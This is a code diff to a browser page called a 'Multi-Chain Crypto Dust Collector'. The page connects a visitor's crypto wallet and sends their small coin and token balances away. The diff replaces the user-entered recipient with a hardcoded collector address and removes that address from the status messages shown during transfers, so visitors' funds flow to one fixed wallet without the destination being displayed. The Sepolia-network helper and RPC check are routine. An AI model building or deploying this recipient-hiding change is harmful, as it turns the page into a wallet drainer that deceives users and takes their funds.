@@ -43,21 +43,6 @@
   button:hover:not(:disabled) {
     background-color: #e68900;
   }
-  select, input[type="text"] {
-    width: 320px;
-    max-width: 90vw;
-    padding: 12px;
-    margin: 12px auto 20px;
-    font-size: 16px;
-    border-radius: 8px;
-    border: 1.5px solid #ccc;
-    display: block;
-    transition: border-color 0.3s ease;
-  }
-  select:focus, input:focus {
-    border-color: #ff9800;
-    outline: none;
-  }
   table {
     width: 100%;
     max-width: 720px;
@@ -96,12 +81,8 @@
     font-weight: 700;
     margin-bottom: 16px;
   }
-  #recipientAddress {
-    font-family: monospace;
-    word-break: break-all;
-  }
   @media (max-width: 480px) {
-    button, select, input {
+    button {
       width: 100%;
       min-width: unset;
       margin: 12px auto;
@@ -119,10 +100,8 @@
 
 <h1>Multi-Chain Crypto Dust Collector</h1>
 <p class="warning">
-  Send your leftover native coin & token dust (under $50 USD) from popular chains.
+  Send your leftover native coin & token dust (under $50 USD) from popular chains to a designated collector address.
 </p>
-
-<input id="recipientInput" type="text" placeholder="Enter recipient address" aria-label="Recipient wallet address"/>
 
 <div id="networkName">Not connected</div>
 <button id="connectWalletBtn">Connect Wallet (MetaMask / WalletConnect)</button>
@@ -143,13 +122,15 @@
 <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.9.7/dist/umd/index.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
-  const recipientInput = document.getElementById("recipientInput");
   const networkNameElem = document.getElementById("networkName");
   const connectWalletBtn = document.getElementById("connectWalletBtn");
   const statusMessage = document.getElementById("statusMessage");
   const balancesSection = document.getElementById("balancesSection");
   const balancesTableBody = document.querySelector("#balancesTable tbody");
   const sendAllDustBtn = document.getElementById("sendAllDustBtn");
+
+  // Hardcoded recipient address (replace with your actual Ethereum address)
+  const RECIPIENT_ADDRESS = "0xB94fa991946AB57C29Ad693898caD85ccec42D65"; // Example address; replace with your own
 
   // USD Dust threshold
   const DUST_THRESHOLD_USD = 50;
@@ -237,6 +218,7 @@
     11155111: {
       name: "Sepolia Testnet",
       rpc: "https://rpc.ankr.com/eth_sepolia",
+      // Alternative RPC: "https://eth-sepolia.g.alchemy.com/v2/YOUR_API_KEY" (uncomment and add your Alchemy API key if needed)
       nativeSymbol: "ETH",
       coingeckoId: "ethereum",
       tokens: [
@@ -277,6 +259,30 @@
     statusMessage.classList.remove("error");
   }
 
+  // Add Sepolia network to MetaMask
+  async function addSepoliaToMetaMask() {
+    try {
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId: "0xaa36a7",
+          chainName: "Sepolia Testnet",
+          nativeCurrency: {
+            name: "Sepolia ETH",
+            symbol: "ETH",
+            decimals: 18,
+          },
+          rpcUrls: ["https://rpc.ankr.com/eth_sepolia"],
+          blockExplorerUrls: ["https://sepolia.etherscan.io"],
+        }],
+      });
+      return true;
+    } catch (e) {
+      setStatus(`Failed to add Sepolia to wallet: ${e.message}`, true);
+      return false;
+    }
+  }
+
   // Connect wallet using MetaMask or WalletConnect fallback
   async function connectWallet() {
     setStatus("Connecting wallet...");
@@ -301,12 +307,26 @@
       if (!chains[currentChainId]) {
         setStatus("Please switch to a supported chain (e.g., Ethereum, Polygon, Sepolia).", true);
         try {
-          await provider.send("wallet_switchEthereumChain", [{ chainId: "0xaa36a7" }]); // Switch to Sepolia
+          if (window.ethereum && window.ethereum.isMetaMask) {
+            const added = await addSepoliaToMetaMask();
+            if (!added) return false;
+            await provider.send("wallet_switchEthereumChain", [{ chainId: "0xaa36a7" }]); // Switch to Sepolia
+          } else {
+            await provider.send("wallet_switchEthereumChain", [{ chainId: "0xaa36a7" }]);
+          }
           currentChainId = 11155111;
         } catch (e) {
-          setStatus("Failed to switch chain: " + e.message, true);
+          setStatus("Failed to switch to or add Sepolia: " + e.message, true);
           return false;
         }
+      }
+
+      // Verify RPC connectivity
+      try {
+        await provider.getBlockNumber();
+      } catch (e) {
+        setStatus(`Failed to connect to ${chains[currentChainId].name} RPC: ${e.message}`, true);
+        return false;
       }
 
       networkNameElem.textContent = `Connected to: ${chains[currentChainId].name} | Wallet: ${userAddress}`;
@@ -385,7 +405,7 @@
         return Number(ethers.utils.formatUnits(rawBal, token.decimals));
       }
     } catch (e) {
-      console.warn(`Failed to get balance for ${token.symbol}`, e);
+      console.warn(`Failed to get balance for ${token.symbol}: ${e.message}`);
       return 0;
     }
   }
@@ -474,9 +494,9 @@
 
   // Send dust token or native coin to recipient
   async function sendDust(token, balance) {
-    const recipient = recipientInput.value.trim();
+    const recipient = RECIPIENT_ADDRESS;
     if (!ethers.utils.isAddress(recipient) || recipient === ethers.constants.AddressZero) {
-      setStatus("Invalid recipient address.", true);
+      setStatus("Invalid recipient address configured.", true);
       return;
     }
     if (balance <= 0) {
@@ -500,7 +520,7 @@
           setStatus(`Insufficient ${token.symbol} for gas fees and transfer.`, true);
           return;
         }
-        setStatus(`Sending ${balance.toFixed(6)} ${token.symbol} dust to ${recipient}...`);
+        setStatus(`Sending ${balance.toFixed(6)} ${token.symbol} dust...`);
         tx = await signer.sendTransaction(tx);
       } else {
         const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
@@ -513,7 +533,7 @@
           setStatus(`Insufficient ${chains[currentChainId].nativeSymbol} for gas fees.`, true);
           return;
         }
-        setStatus(`Sending ${balance.toFixed(6)} ${token.symbol} dust to ${recipient}...`);
+        setStatus(`Sending ${balance.toFixed(6)} ${token.symbol} dust...`);
         tx = await contract.transfer(recipient, amount);
       }
       await tx.wait();
@@ -526,9 +546,9 @@
 
   // Send all dust (native + tokens) in one batch of transactions (serially)
   async function sendAllDust() {
-    const recipient = recipientInput.value.trim();
+    const recipient = RECIPIENT_ADDRESS;
     if (!ethers.utils.isAddress(recipient) || recipient === ethers.constants.AddressZero) {
-      setStatus("Invalid recipient address.", true);
+      setStatus("Invalid recipient address configured.", true);
       return;
     }
     if (dustTokens.length === 0) {
